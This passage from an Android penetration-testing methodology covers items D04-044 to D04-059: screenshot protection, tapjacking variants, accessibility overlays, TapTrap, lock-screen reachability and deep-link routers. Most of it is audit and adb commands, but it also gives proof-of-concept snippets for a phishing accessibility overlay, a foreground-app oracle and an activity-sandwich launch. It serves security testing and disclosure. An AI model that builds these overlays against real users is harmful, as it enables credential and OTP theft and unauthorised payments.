| **Applies to** | all; the three named tests are `status: placeholder` in the current MASTG, so there is no published procedure — test them by hand |
| **Maps to** | MASTG-TEST-0292 (`setRecentsScreenshotEnabled` not used), MASTG-TEST-0293 (`SurfaceView.setSecure` not used), MASTG-TEST-0294 (Compose dialog `SecureOn` not used); MASTG-TEST-0291 |

- **Test:** Three gaps sit under a correctly-set `FLAG_SECURE`: a transition that clears it, a `SurfaceView`
  (video, camera preview, map, PDF renderer) that carries its own secure flag, and a Compose `Dialog` whose
  window is separate from the activity's. Plus `setRecentsScreenshotEnabled(false)`, which addresses the
  Recents snapshot specifically.
- **How:**
  ```bash
  grep -rnE 'clearFlags\([^)]*FLAG_SECURE|setRecentsScreenshotEnabled|SurfaceView|setSecure\(|DialogProperties|SecureFlagPolicy' out/sources/
  ```
  On device, capture at three moments: mid-transition into the secure screen, while a `SurfaceView` is
  rendering, and with a Compose dialog open over a secure activity.
  ```bash
  adb exec-out screencap -p > shot_transition.png
  adb exec-out screencap -p > shot_surfaceview.png
  adb exec-out screencap -p > shot_dialog.png
  ```
- **Proof:** A capture that is **not** black at one of those three moments on a screen the app otherwise
  protects — plus the `clearFlags` call site if that is the cause. The contrast against the black steady-state
  capture is the finding.
- **Escalation:** Same as D04-042: needs a named consumer. A `clearFlags` during a transition is the more
  reportable of the three because it is a defect in the app's own control rather than a platform gap.
- **Ruled out when:** No `clearFlags(FLAG_SECURE)` exists, every `SurfaceView` on a sensitive screen calls
  `setSecure(true)`, and every Compose dialog on one sets its secure flag policy — with a black capture at
  each of the three moments above.

### D04-045 · Orientation and aspect-ratio locks ignored on large screens (targetSdk 36) unmask a field the portrait layout hid

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-11 |
| **Applies to** | targetSdk 36+ on `sw600dp`+ displays; games (`android:appCategory`) are excepted |
| **Maps to** | `about/versions/16/behavior-changes-16` — for displays with `smallestWidth >= 600dp`, `android:screenOrientation`, `android:resizableActivity`, `android:minAspectRatio`, `android:maxAspectRatio` and `Activity#setRequestedOrientation()` are ignored; opt-out `<property android:name="android.window.PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY" android:value="true"/>` is temporary and does not apply at API 37+ |

- **Test:** Apps that masked a field, truncated a PAN, or positioned a security affordance assuming fixed
  portrait geometry now render differently on tablets and foldables. This is disclosure by layout on a form
  factor the developer never tested.
- **How:**
  ```bash
  grep -nE 'screenOrientation|minAspectRatio|maxAspectRatio|resizeableActivity|PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY' out/AndroidManifest.xml
  ```
  Install on an `sw600dp`+ AVD, rotate, and compare against the phone layout screen by screen.
- **Proof:** A masked card number or an otherwise-hidden pane fully visible in landscape on a large screen,
  side by side with the portrait capture that hid it.
- **Escalation:** -> D20 privacy. Pair with D04-042 where the newly-visible pane is also not `FLAG_SECURE`.
- **Ruled out when:** `targetSdkVersion < 36`, or the layouts are genuinely responsive and the masking is
  implemented in the data layer (the view never receives the unmasked value) rather than by layout — verified
  by the large-screen capture showing the same masking.

### D04-046 · Edge-to-edge enforcement (targetSdk 35/36) hides the material terms of a confirmation

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rate on the action confirmed |
| **Attacker** | AM-01 (no attacker required — the app does it to itself), escalating with AM-04 |
| **Applies to** | targetSdk 35+ / 36+ |
| **Maps to** | `about/versions/15/behavior-changes-15` (edge-to-edge default, `Window.setStatusBarColor()` and friends are no-ops, `Configuration.screenWidthDp/screenHeightDp/orientation` now include the system bars); `about/versions/16/behavior-changes-16` (`R.attr#windowOptOutEdgeToEdgeEnforcement` deprecated and disabled) |

- **Test:** At targetSdk 35 all apps are edge-to-edge by default; at 36 the opt-out is disabled entirely.
  Security-relevant UI — a transaction amount, a recipient name, a consent sentence, a "secure connection"
  indicator — can now be drawn under the status or navigation bar while the confirm button stays tappable.
  That is UI redress by layout rather than by overlay, and the user authorises an action whose terms they
  cannot read.
- **How:**
  ```bash
  grep -rnE 'windowOptOutEdgeToEdgeEnforcement|setDecorFitsSystemWindows|setStatusBarColor|WindowInsets' out/res out/sources/
  ```
  Run the app on Android 15 and 16 with gesture navigation and again with three-button navigation; capture
  both.
- **Proof:** A screenshot showing the confirmation amount or consent text clipped behind the system bar while
  the confirm button remains tappable.
- **Escalation:** -> D23 payment-confirmation ambiguity. Combine with D04-048 (partial occlusion): if the app
  already hides the amount by layout, the attacker only needs to cover the recipient.
- **Ruled out when:** Every confirmation screen applies `WindowInsets` padding so the material terms sit
  inside the safe area on both navigation modes — verified by capturing both modes on an Android 16 device.

### D04-047 · Classic full-occlusion tapjacking — and verifying whether the platform already stops it

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (**P5**) |
| **Attacker** | AM-04 (`SYSTEM_ALERT_WINDOW` is a user-granted special permission from Android 6.x) |
| **Applies to** | app-side `filterTouchesWhenObscured` gap on all versions; the *exploit* is largely mitigated on Android 12 / API 31+ |
| **Maps to** | MASTG-TEST-0340 (References to Overlay Attack Protections); MASWE-0039 (App Vulnerable to Overlay Attacks, CWE-1021), MASWE-0036; MASVS-PLATFORM-3; MASTG-KNOW-0022, MASTG-BEST-0040; `risks/tapjacking`; MobSF `android_tapjacking`, mobsfscan `android_detect_tapjacking`; mindedsecurity `MSTG-PLATFORM-9_1`/`9_2`; AOSP threat [T.A6]; ATT&CK T1516, T1417.002 |

- **Test:** Whether the app's security-relevant confirmation views accept a touch while another window covers
  them. The app-side control is `android:filterTouchesWhenObscured="true"` /
  `View.setFilterTouchesWhenObscured(true)` / an `onFilterTouchEventForSecurity` override. **But** on Android
  12+ the platform blocks touches passing through an unsafely-obscuring overlay by default, with documented
  exceptions: accessibility overlays (`TYPE_ACCESSIBILITY_OVERLAY`), IME windows (`TYPE_INPUT_METHOD`),
  assistant windows, fully invisible windows, alpha-0 windows, and system-alert windows whose combined
  opacity is at or below the threshold (0.8 by default). So the honest test has two halves: is the app-side
  flag missing, and does a tap actually land.
- **How:**
  ```bash
  grep -rnE 'filterTouchesWhenObscured|setFilterTouchesWhenObscured|onFilterTouchEventForSecurity|FLAG_WINDOW_IS_(PARTIALLY_)?OBSCURED|setHideOverlayWindows|accessibilityDataSensitive' out/res/layout/ out/sources/
  grep -iE 'HIDE_OVERLAY_WINDOWS|SYSTEM_ALERT_WINDOW' out/AndroidManifest.xml
  # the platform half
  adb shell settings get global block_untrusted_touches     # 2 = block (default on 12+)
  adb shell appops set com.poc.overlay SYSTEM_ALERT_WINDOW allow
  adb logcat -c
  # tap through the overlay, then:
  adb logcat -d | grep 'Untrusted touch due to occlusion by'
  # to build/verify the PoC against a pre-12 target behaviour:
  adb shell am compat disable BLOCK_UNTRUSTED_TOUCHES com.target.app
  adb shell am compat reset   BLOCK_UNTRUSTED_TOUCHES com.target.app
  ```
  PoC overlay: a `TYPE_APPLICATION_OVERLAY` window at `alpha=0.7` with
  `FLAG_NOT_TOUCH_MODAL | FLAG_LAYOUT_IN_SCREEN`, decoy text over the victim's confirm control.
- **Proof:** **Absence** of `Untrusted touch due to occlusion by <pkg>` in logcat while the victim still
  receives the tap means the overlay is in an exempt class and tapjacking is genuinely exploitable.
  **Presence** of that line with the tap dropped means the platform already mitigates it — do not report.
  Carlos Polop's `Tapjacking-ExportedActivity` PoC (launches the victim's exported activity then overlays it)
  is a ready harness.
- **Escalation:** P5 as filed. It converts only by naming the action completed — D04-048 (partial occlusion,
  the live variant), D04-050 (accessibility overlay, exempt from the block), D04-051 (TapTrap, needs no
  overlay permission at all), -> D23 for a payment, -> D03 for a self-granted permission. Google's Invalid
  Reports page excludes this on a non-security-critical screen and carves out exactly three cases: overlays
  that interfere with a **permission** approval, with **app-installation** approval, or that **hide a
  privacy-sensor indicator**.
- **Ruled out when:** The confirmation view sets `filterTouchesWhenObscured` (or overrides
  `onFilterTouchEventForSecurity`) **and** the logcat line appears with the tap dropped. Also a true negative
  when the only obscurable controls are non-security-relevant — say which screens you enumerated.

### D04-048 · Partial occlusion — the variant Android 12 does not block

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) as filed; move it to the action's own category (-> D23) to be paid |
| **Attacker** | AM-04 |
| **Applies to** | all; this is the live variant on API 31+ |
| **Maps to** | MASTG-TEST-0340; MASWE-0039; `risks/tapjacking`; ATT&CK T1516 |

- **Test:** In partial occlusion the touch target itself stays unobscured — so `filterTouchesWhenObscured`
  never fires — while the surrounding **context** is replaced. The amount field is covered, the recipient
  name is covered, the "Confirm" button is not. The only detection available to the app is manually checking
  `MotionEvent.FLAG_WINDOW_IS_PARTIALLY_OBSCURED`, and almost nobody does.
- **How:**
  ```bash
  grep -rn 'FLAG_WINDOW_IS_PARTIALLY_OBSCURED\|FLAG_WINDOW_IS_OBSCURED' out/sources/
  grep -rn 'setHideOverlayWindows' out/sources/
  ```
  Build the overlay to cover only the transaction detail, leaving a hole over the confirm control, and keep
  the overlay's own alpha below 0.8 so the API 31 threshold is not tripped.
- **Proof:** A recording of the victim confirming an amount and recipient different from what was displayed,
  **plus** the backend request showing the real values. The backend request is what separates this from a
  cosmetic demo.
- **Escalation:** -> D23 unauthorised payment. File it as a payments finding, not a tapjacking finding — an
  overlay that completes a transfer is not `mobile_security_misconfiguration.tapjacking`.
- **Ruled out when:** The confirmation screen calls `Window.setHideOverlayWindows(true)` (API 31+) so no
  non-system overlay can coexist with it, or it re-reads and re-displays the material terms from its own
  window immediately before committing — verified by attempting the partial overlay and observing the app
  refuse to render or refuse to commit.

### D04-049 · Prove the *trigger*, not just the overlay

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs every tapjacking claim |
| **Attacker** | AM-04 |
| **Applies to** | every overlay item in this chapter |
| **Maps to** | `risks/tapjacking`; ATT&CK T1453 (Abuse Accessibility Features), T1417.002 |

- **Test:** Triage closes overlay findings as theoretical because the attacker cannot know **when** the
  confirm button is on screen. A reportable tapjack needs a demonstrated oracle. Three work today.
- **How:** Build the overlay app with `SYSTEM_ALERT_WINDOW` only, then add exactly one oracle:
  ```java
  // (a) ContentObserver oracle — zero extra permission
  // (b) PACKAGE_USAGE_STATS — user-granted via Settings
  UsageStatsManager u = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
  UsageEvents ev = u.queryEvents(System.currentTimeMillis() - 2000, System.currentTimeMillis());
  // look for MOVE_TO_FOREGROUND for com.target.app
  // (c) AccessibilityService — TYPE_WINDOW_STATE_CHANGED + getClassName() == the confirm activity
  ```
  ```bash
  adb shell appops set com.poc.overlay SYSTEM_ALERT_WINDOW allow
  adb shell appops get com.poc.overlay
  adb shell settings put secure enabled_accessibility_services com.poc.overlay/.Svc   # only for (c)
  adb shell settings get secure enabled_accessibility_services
  ```
- **Proof:** A screen recording in which the overlay appears **within one frame of** the target's confirm
  dialog, repeated three times, with the oracle's log line timestamped alongside. Overlay-without-timing
  recordings do not survive triage.
- **Escalation:** The accessibility oracle is itself the permission self-grant primitive -> D03; the usage
  oracle costs the user one Settings toggle. Severity is set by *what* you covered, not by the overlay's
  existence.
- **Ruled out when:** No oracle is available to a zero- or one-permission app for this particular screen —
  for example the confirm dialog is a `Dialog` on an activity whose class name never changes, and the app
  holds `HIDE_OVERLAY_WINDOWS`. Note that Android 12+ hides overlays over **system** permission dialogs via
  `HIDE_NON_SYSTEM_OVERLAY_WINDOWS`, so target-app dialogs only, and say so.

### D04-050 · `TYPE_ACCESSIBILITY_OVERLAY` — a full-screen overlay with no "draw over other apps" prompt

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the captured-credential outcome is `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-04 (the user enables an accessibility service) |
| **Applies to** | all; API 34+ gives the app a concrete defence to check for |
| **Maps to** | HackTricks `tapjacking.md` ("Accessibility Overlay Phishing (Banking-Trojan Variant)"), `accessibility-services-abuse.md`; MASWE-0040; ATT&CK T1453, T1417.002; `risks/tapjacking` (accessibility overlays are an explicit exception to the Android 12 touch block) |

- **Test:** A window of type `TYPE_ACCESSIBILITY_OVERLAY` is added **without ever triggering the "draw over
  other apps" dialog**, and with `FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL` the original touches still reach
  the app underneath. It is also one of the documented exemptions from the Android 12 untrusted-touch block.
  The question for the target app is whether it defends its sensitive screens against it at all.
- **How:**
  ```java
  WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
      MATCH_PARENT, MATCH_PARENT,
      WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
      WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
      WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
      PixelFormat.TRANSLUCENT);
  wm.addView(phishingView, lp);
  ```
  ```bash
  adb shell settings get secure enabled_accessibility_services
  adb shell dumpsys accessibility | grep "Accessibility Service"
  adb shell pm list packages -3 -e BIND_ACCESSIBILITY_SERVICE
  # the app-side defence, API 34+
  grep -rn 'accessibilityDataSensitive' out/res/layout/ out/sources/
  ```
- **Proof:** The phishing view rendering full-screen over the target while the target still receives the
  gestures (the real transaction completes), and **no `SYSTEM_ALERT_WINDOW` prompt was ever shown**.
- **Escalation:** High to Critical for banking and wallet targets — credential and OTP capture with the real
  transaction executing underneath, which is the standard banking-trojan chain. The reportable app-side gap
  is the set of missing defences: `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API
  34+, and note it is implicitly enabled by `android:filterTouchesWhenObscured="true"` from Android 16) on
  sensitive views, missing `setFilterTouchesWhenObscured(true)` and `FLAG_SECURE`, and no refusal to operate
  while a non-trusted accessibility service is active.
- **Ruled out when:** Sensitive views set `accessibilityDataSensitive` (or `filterTouchesWhenObscured`, which
  implies it on Android 16) **and** the app declines to render the confirmation while an untrusted
  accessibility service is enabled — verified by enabling a stub service and observing the refusal.

### D04-051 · TapTrap — animation-driven tapjacking that needs no overlay permission

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) as filed; the *outcome* (a granted dangerous permission, device-admin activation) is the reportable category |
| **Attacker** | AM-03 — no overlay permission required |
| **Applies to** | Android 13–16 per the researchers; **fixed by the December 2025 security update**. Report against builds below that patch level, and against apps that still meet all three preconditions on a patched build as defence-in-depth |
| **Maps to** | TapTrap, USENIX Security 2025 (taptrap.click), TU Wien; HackTricks `android-checklist.md` ("Test for Tapjacking / Animation-driven attacks (TapTrap 2025) even on Android 15+ (no overlay permission required)") |

- **Test:** A malicious app launches the target activity **into the same task** with a custom transition
  animation at roughly 0.01 alpha via `overridePendingTransition()` or
  `ActivityOptions.makeCustomAnimation()`. The effectively-invisible activity receives every touch while the
  attacker's decoy stays visible. Because it is not a `SYSTEM_ALERT_WINDOW`, neither
  `Settings.canDrawOverlays()` nor `setFilterTouchesWhenObscured()` sees it. The researchers report 76.3% of
  apps meet the preconditions.
- **How:** Confirm the three preconditions the research names for a vulnerable activity — (1) launchable by
  an external app, (2) runs in the **same task** as the launcher, (3) does not override its own transition
  animation and does not gate input on animation completion:
  ```bash
  python3 - <<'PY'
  import xml.dom.minidom as m
  d = m.parse('out/AndroidManifest.xml'); NS='android'
  for a in d.getElementsByTagName('activity'):
      if a.getAttribute(f'{NS}:exported') == 'true' and \
         a.getAttribute(f'{NS}:launchMode') not in ('singleInstance', 'singleInstancePerTask'):
          print('TAPTRAP-CANDIDATE', a.getAttribute(f'{NS}:name'))
  PY
  grep -rn 'overridePendingTransition\|makeCustomAnimation' out/sources/
  adb shell getprop ro.build.version.security_patch
  ```
- **Proof:** A screen recording in which the visible UI is the attacker's decoy while a tap lands on the
  victim's confirm or grant control, verified by the resulting state change:
  ```bash
  adb shell dumpsys package com.target.app | grep -A20 "runtime permissions"
  adb shell dpm list-owners
  ```
- **Escalation:** The researchers reached permissions up to **Device Administrator** (enabling remote wipe)
  and camera/microphone/location grants — chain to D25 (device admin) and D20 (camera/mic). This is the
  tapjacking variant to lead with on a modern fleet, because D04-047 is largely dead there.
- **Ruled out when:** The device fleet is at or above the December 2025 SPL **and** every sensitive activity
  either forces `singleInstance`/`singleInstancePerTask`, overrides its own transition animation, or gates
  input until the animation completes. The candidate script returning no rows is the static half; the patch
  level is the platform half — record both.

### D04-052 · The activity sandwich — launch the victim's exported activity, then overlay your own in the same task

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) as filed; rate on the action |
| **Attacker** | AM-03 — no overlay permission |
| **Applies to** | all; the documented mitigation is "don't export activities unnecessarily" |
| **Maps to** | `risks/tapjacking` (the documented variant); ATT&CK T1417.002 |

- **Test:** A malicious app launches an activity from the victim and then overlays it with its own activity
  in the same task — a partial occlusion that abuses the victim's own exported surface and needs no overlay
  permission at all.
- **How:** From the stub app, with `FLAG_ACTIVITY_NEW_TASK` **cleared** so both live in one task:
  ```java
  startActivity(new Intent().setClassName("com.target.app","com.target.app.ConfirmActivity"));
  startActivity(new Intent(this, MyDecoyActivity.class));   // no NEW_TASK
  ```
  ```bash
  adb shell dumpsys activity activities | sed -n '/Task{/,+12p'
  ```
- **Proof:** `dumpsys activity activities` showing both activities in one task with the attacker on top, plus
  a screen recording of the blended UI and the victim's action completing.
- **Escalation:** -> D13 credential phishing. Combine with D04-030 so the victim activity you sandwich is a
  resurfaced mid-flow confirmation.
- **Ruled out when:** The sensitive activity is `exported="false"` (so you cannot place it), or it is
  `launchMode="singleInstance"` so it cannot share a task with your decoy — verified by the `dumpsys` output
  showing two distinct tasks.

### D04-053 · `Window.setHideOverlayWindows(true)` absent on the screens that authorise something

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) |
| **Attacker** | AM-04 |
| **Applies to** | API 31+ only; below that, touch filtering is the sole control |
| **Maps to** | MASTG-TEST-0340; MASTG-BEST-0040; `risks/tapjacking`; Bugcrowd's own remediation note for the tapjacking path ("set `filterTouchesWhenObscured` true or implement `onFilterTouchEventForSecurity()`") |

- **Test:** From API 31 an app can require that no non-system overlay coexists with its window, via
  `setHideOverlayWindows(true)` and the `HIDE_OVERLAY_WINDOWS` permission. Its absence on a
  transaction-confirmation, permission-rationale or account-linking screen is the concrete hardening gap to
  cite alongside D04-048 — because touch filtering alone does not address partial occlusion.
- **How:**
  ```bash
  grep -rn 'setHideOverlayWindows' out/sources/
  grep -n 'HIDE_OVERLAY_WINDOWS' out/AndroidManifest.xml
  xmlstarlet sel -t -v "//uses-sdk/@android:targetSdkVersion" -n out/AndroidManifest.xml
  adb shell dumpsys window windows | grep -E 'mOwnerUid|Window\{|mAttrs' | head -40
  ```
- **Proof:** The API level supports it, the permission is absent from the manifest, and your overlay from
  D04-048 remains visible over the confirmation screen — shown by `dumpsys window windows` listing both
  windows with different `mOwnerUid` values.
- **Escalation:** Bundle it into the D04-048 report as the missing control. Filed alone it is a P5
  configuration note.
- **Ruled out when:** The app declares `HIDE_OVERLAY_WINDOWS` and calls `setHideOverlayWindows(true)` on
  every authorising screen — verified by your overlay disappearing when that screen comes forward. On a
  target below API 31 the control cannot exist; record "not applicable at targetSdk N" and fall back to
  D04-047's flag check.

### D04-054 · Predictive back (targetSdk 36) silently disables a security control implemented in `onBackPressed()`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rate on what the control protected |
| **Attacker** | AM-01 (the platform disables it) escalating with AM-11 |
| **Applies to** | targetSdk 36+ on Android 16; also verify on Android 15 where animations are default-on for opted-in apps |
| **Maps to** | `about/versions/16/behavior-changes-16` — predictive back default at targetSdk 36; "`onBackPressed()` no longer called"; "`KeyEvent.KEYCODE_BACK` not dispatched"; `android:enableOnBackInvokedCallback`; `guide/navigation/custom-back/predictive-back-gesture` |

- **Test:** At targetSdk 36 the system enables predictive back by default: `onBackPressed()` is no longer
  called and `KEYCODE_BACK` is not dispatched. Apps that implemented lock-on-back, clear-sensitive-buffer or
  confirm-before-leaving-payment inside `onBackPressed()` lose that control silently unless they migrated to
  `OnBackInvokedCallback` / `OnBackPressedCallback`.
- **How:**
  ```bash
  grep -rn 'onBackPressed\|KEYCODE_BACK' out/sources/ | grep -v 'OnBackPressedCallback\|OnBackInvokedCallback'
  grep -n 'enableOnBackInvokedCallback' out/AndroidManifest.xml
  ```
  Then on an Android 16 device with targetSdk 36, drive the screen and swipe back while watching state:
  ```bash
  frida -U -n com.target.app -e 'Java.perform(function(){var A=Java.use("com.target.app.PinActivity");A.clearBuffer.implementation=function(){console.log("clearBuffer CALLED");return this.clearBuffer();};});'
  ```
- **Proof:** A sensitive screen that previously cleared its buffer or re-locked on Back now exits with state
  intact — the Frida hook on the clearing method showing it is never invoked, or re-entering the app and
  finding the field pre-filled.
- **Escalation:** -> D11 residual sensitive data in UI state. Medium; **High** if the retained state is a PAN
  or an OTP.
- **Ruled out when:** Every back-related security action is registered through `OnBackPressedCallback` /
  `OnBackInvokedCallback`, verified by the hook firing on a back swipe at targetSdk 36. A target below 36 is
  not yet affected — record the targetSdk and flag it as a forward-looking issue.

### D04-055 · `PRIORITY_SYSTEM_NAVIGATION_OBSERVER` used as if it blocked navigation

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); usually a business-logic defect |
| **Attacker** | AM-01 |
| **Applies to** | Android 16+ |
| **Maps to** | `guide/navigation/custom-back/predictive-back-gesture` — the priority constants `PRIORITY_DEFAULT`, `PRIORITY_OVERLAY`, `PRIORITY_SYSTEM_NAVIGATION_OBSERVER`, the last documented as "Observer-only; doesn't consume event" |

- **Test:** Android 16 added an observer-only back priority that does **not** consume the event. Code that
  registers a "confirm before leaving" handler at that priority runs its logic while the navigation proceeds
  regardless — so the confirmation dialog appears and the activity finishes at the same time.
- **How:**
  ```bash
  grep -rn 'PRIORITY_SYSTEM_NAVIGATION_OBSERVER' out/sources/ -B6 -A10
  ```
  Drive the screen the callback guards and swipe back.
- **Proof:** The confirm dialog appearing while the activity simultaneously finishes — recorded, and
  confirmed with `dumpsys activity activities` showing the activity gone.
- **Escalation:** -> D15 unintended-action / business-logic bypass. If the guarded action is a payment or an
  irreversible delete, rate it there rather than here.
- **Ruled out when:** Every blocking confirmation is registered at `PRIORITY_DEFAULT` or `PRIORITY_OVERLAY`,
  or the observer priority is used only for analytics — verified by the back gesture being consumed.

### D04-056 · `showWhenLocked` / `turnScreenOn` activity reachable before unlock

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if it reaches the account |
| **Attacker** | AM-10 physical locked; AM-03 where an installed app supplies the trigger |
| **Applies to** | all. Android 15+ restricts *background* activity launches, so trigger it with a foreground-equivalent path (notification action, Quick Settings tile, NFC tag, USB attach) and say which you used |
| **Maps to** | `guide/topics/manifest/activity-element` (`android:showWhenLocked`); `frameworks/base` `KeyguardManager.requestDismissKeyguard` javadoc, verbatim: "The activity must either be visible by using `android.R.attr#showWhenLocked` or `Activity#setShowWhenLocked(boolean)`, or must be in a state in which it would be visible if Keyguard would not be hiding it"; AOSP rates lockscreen bypass **High** |

- **Test:** An activity with `android:showWhenLocked="true"` (or `setShowWhenLocked(true)`) displays **over
  the keyguard**. If any such activity renders account data, accepts input, or can be navigated deeper, a
  person holding a locked phone has pre-unlock access. Most testers grep for the attribute and never test
  reachability or navigation out of it.
- **How:**
  ```bash
  grep -nE 'showWhenLocked|turnScreenOn' out/AndroidManifest.xml
  grep -rnE 'setShowWhenLocked|setTurnScreenOn|FLAG_SHOW_WHEN_LOCKED|FLAG_DISMISS_KEYGUARD|requestDismissKeyguard' out/sources/
  # the device must have a real PIN set
  adb shell input keyevent 26                       # screen off / lock
  adb shell am start -n com.target.app/.TheActivity -a <its action>
  adb shell input keyevent 224                      # wake
  adb exec-out screencap -p > locked.png
  adb shell dumpsys window | grep -E 'mDreamingLockscreen|KeyguardController|showWhenLocked'
  ```
  Then try to navigate **out** of it: Back, Recents, any in-activity link, and any `startActivity` it makes.
- **Proof:** `locked.png` showing app content with the keyguard still active, plus the `dumpsys window` lines
  confirming the keyguard was up. The stronger finding is the second hop: reaching an activity that is *not*
  itself `showWhenLocked` from the one that is — that is a keyguard-bypass shape.
- **Escalation:** Pre-unlock reachability plus a deep-link router (D04-058) gives a locked-device attacker
  arbitrary in-app routes -> D09; chain with the NFC/USB triggers in D25 for a no-touch version. Note the
  distinction the programs draw: a *system* lockscreen bypass is high value (Android & Google Devices
  top-tier lists "Software-Based Lockscreen Bypass — Up to $150,000"), while a *secondary* app-level PIN
  bypass is explicitly non-qualifying under Google's Mobile VRP — say which you have.
- **Ruled out when:** No activity declares `showWhenLocked`/`turnScreenOn` and no code calls the setters, or
  the only such activity is a call/alarm screen with no account data and no navigation out — verified by the
  locked launch above rendering nothing and Back returning to the keyguard.

### D04-057 · `android:showForAllUsers` / `android:directBootAware` on an activity that renders user data

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_access_control.privilege_escalation` (null) for the cross-user case |
| **Attacker** | AM-05 another user of the same device/profile; AM-10 for the pre-unlock case |
| **Applies to** | `showForAllUsers` is API 23+; `directBootAware` defaults to `false` |
| **Maps to** | `guide/topics/manifest/activity-element` — `android:showForAllUsers` makes an activity display when the current user differs from the launching user; `android:directBootAware`, "during Direct Boot, activity can only access device-protected storage" |

- **Test:** Either attribute on a data-rendering component is a boundary crossing: `showForAllUsers` shows
  one profile's content in another's session, and `directBootAware` makes a component run **before first
  unlock**, where only device-protected storage is available — which is exactly where a developer should not
  have put user data.
- **How:**
  ```bash
  grep -nE 'showForAllUsers|directBootAware' out/AndroidManifest.xml
  adb shell pm list users
  adb shell am start --user 10 -n com.target.app/.TheActivity     # secondary / work profile user
  adb reboot && adb wait-for-device
  adb shell am start -n com.target.app/.TheActivity               # before unlock
  adb exec-out screencap -p > preunlock.png
  ```
- **Proof:** The activity rendering user content on the lock screen pre-unlock, or under a different Android
  user id — captured with `pm list users` output showing which user id you were.
- **Escalation:** -> D25 private space / work profile boundary crossing; -> D11 for whatever the app placed
  in device-protected storage to make direct-boot work.
- **Ruled out when:** Neither attribute appears, or the only `directBootAware` component is a receiver that
  schedules work without reading user data — verified by the pre-unlock launch rendering an empty or
  "unlock to continue" state.

### D04-058 · Map the deep-link trampoline / router activity's route table before testing anything downstream

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03; AM-02 through the browser |
| **Applies to** | all apps with a single entry activity that dispatches by URI |
| **Maps to** | MASTG-TECH-0172 (Listing Deep Links); the worked shape in the corpus is Meesho's `TrampolineActivity` -> `AbstractC11424m5.m21326b(host, data)` |

- **Test:** Most modern apps funnel every external entry through one exported trampoline activity that turns
  a `Uri` into an internal route. The common pattern is a query parameter (e.g. `host_internal=`) selecting a
  route while **all** query parameters become a `data` map dispatched by a large switch. Each case in that
  switch is an action reachable from an untrusted link, and the switch is what you must read — not the
  manifest.
- **How:**
  ```bash
  grep -nE '<data[^>]*(scheme|host|pathPrefix)=' out/AndroidManifest.xml | sort -u
  grep -rn 'getIntent()\.getData()' out/sources/ -A20 | grep -nE 'getQueryParameter|getHost|getPath|switch'
  adb shell dumpsys package com.target.app | sed -n '/Schemes:/,/^$/p'
  ```
  Produce a table: **route name · target activity or action · parameters consumed · auth required**.
- **Proof:** The route table itself. It is the artefact triagers want attached to any deep-link or
  exported-activity chain, and it is what tells you which routes to test in D04-007 and D04-010.
- **Escalation:** Prioritise routes reaching a WebView (D04-015 -> D10), a payment or state-changing action
  (-> D23), or a component launcher (-> D08). Where the router honours a signature parameter that gates
  privileged routes (the worked shape is a `pn_trust_sig` HMAC checked in the trampoline), determine the key
  source — an HMAC key inside the APK is forgeable, and forging it promotes every notification-only route to
  web-reachable (-> D12/D24).
- **Ruled out when:** The router resolves routes from a compiled table with no attacker-controllable
  selector, and every privileged route re-checks the session server-side — verified by driving each route in
  the table while logged out and observing a refusal rather than a render.

### D04-059 · Notification trampoline restriction as a locator for the arbitrary-activity-start gadget

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); inherits the PendingIntent finding in D08 |
| **Attacker** | AM-03 / AM-08 |
| **Applies to** | targetSdk >= 31 |
| **Maps to** | `about/versions/12/behavior-changes-12` (notification trampoline restriction, `NOTIFICATION_TRAMPOLINE_BLOCK`, exact logcat string) |

- **Test:** From targetSdk 31 an app cannot start an activity from a service or receiver used as a
  notification trampoline; the platform logs a distinctive line when it happens. The presence of a trampoline
  is a marker of a receiver or service that **starts activities from externally-triggerable input** — exactly
  the D08 surface. And apps that "fixed" the restriction by making the notification's `PendingIntent` a
  *mutable* activity PendingIntent traded a UX bug for an intent-redirection vulnerability.
- **How:**
  ```bash
  adb logcat -c
  # tap the notification, then:
  adb logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
  adb shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app    # debuggable builds
  grep -rn 'setContentIntent(\|addAction(' out/sources/ -B6 | grep -n 'FLAG_MUTABLE'
  ```
  Expected string: `Indirect notification activity start (trampoline) from PACKAGE_NAME`.
- **Proof:** The logcat line naming the target package and the receiver or service it came from — which is
